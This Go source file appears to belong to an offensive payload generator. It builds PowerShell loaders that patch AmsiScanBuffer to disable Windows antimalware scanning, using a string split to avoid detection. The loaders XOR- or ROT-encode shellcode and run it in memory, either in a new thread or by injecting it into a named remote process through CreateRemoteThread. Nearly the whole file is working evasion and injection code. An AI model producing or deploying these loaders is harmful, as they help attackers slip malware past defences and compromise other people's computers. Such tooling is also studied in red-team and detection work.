package payloads

import (
	"bytes"
	"fmt"
	"log"
	"text/template"

	"github.com/Zerx0r/dvenom/internal/cryptor"
	"github.com/Zerx0r/dvenom/internal/helpers"
)

func pwshMain() string {
	return `
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
		Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
	@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
	[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
	DefineDynamicModule('InMemoryModule', $false).
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	
	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
	SetImplementationFlags('Runtime, Managed')
	
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
	SetImplementationFlags('Runtime, Managed')
	
	return $type.CreateType()
}
$funcName = 'A'+'m'+'s'+'i'+'S'+'c'+'a'+'n'+'B'+'u'+'f'+'f'+'e'+'r'
[IntPtr]$funcAddr = LookupFunc amsi.dll $funcName
$funcAddr
$oldProtectionBuffer = [UInt32]::Zero
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)

[Byte[]] $buf = {{.Values.ShellCode}}

{{.Values.DecodeFunc}}

{{.Values.LoaderFunc}}
`
}

func pwshLoaderFunc() string {
	return `
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
	`
}

func pwshProcessInjectionFunc(procName string) string {
	str := `
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [int]) ([IntPtr]))).Invoke(0x001F0FFF, $false, (Get-Process('%s')).Id)
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[IntPtr]$outSide = [IntPtr]::Zero;
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [Int], [IntPtr]) ([bool]))).Invoke($hProcess, $addr, $buf, $buf.Length, $outSide);
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
	`
	return fmt.Sprintf(str, procName)
}

func pwshXor(xorKey string) string {
	str := `
$key = "%s"
for ($i = 0; $i -lt $buf.Length; $i++) {
	$buf[$i] = $buf[$i] -bxor [byte]$key[$i %% $key.Length]
}
	`
	return fmt.Sprintf(str, xorKey)
}

func pwshRot(rotKey string) string {
	str := `
for ($i = 0; $i -lt $buf.Length; $i++) {
	$buf[$i] = [byte](([uint]$buf[$i] - %s) -band 0xFF)
}
	`

	return fmt.Sprintf(str, rotKey)
}

func BuildPwshTemplate(methodType string, cipherType string, key string, procName string, shellCode []byte) string {

	field := helpers.Field{
		Values: make(map[string]string),
	}
	var value []byte
	switch cipherType {
	case "xor":
		value = cryptor.Xor(key, shellCode)
		field.SetValue("DecodeFunc", pwshXor(key))
	case "rot":
		value = cryptor.Rot(key, shellCode)
		field.SetValue("DecodeFunc", pwshRot(key))
	default:
		log.Fatalf("[x] Error: Cipher type %s is not supported with ps1 payload. Supported types: (xor, rot)", cipherType)
	}

	switch methodType {
	case "valloc":
		field.SetValue("LoaderFunc", pwshLoaderFunc())
	case "pinject":
		field.SetValue("LoaderFunc", pwshProcessInjectionFunc(procName))
	default:
		log.Fatalf("[x] Error: Method type %s is not supported in ps1 payload. Supported types: (valloc, pinject)", methodType)
		return ""
	}

	field.SetValue("ShellCode", helpers.BytesToHexArray(value))

	return buildPwshTemplate(field, pwshMain())
}

func buildPwshTemplate(field helpers.Field, vbaTemplate string) string {
	var buffer bytes.Buffer
	t, err := template.New("PwshTemplate").Parse(vbaTemplate)
	if err != nil {
		log.Fatal("[x] Error: Failed to generate ps1 code.", err)
	}

	if err := t.Execute(&buffer, field); err != nil {
		log.Fatal("[x] Error: Failed to generate ps1 code.", err)
	}
	return buffer.String()
}
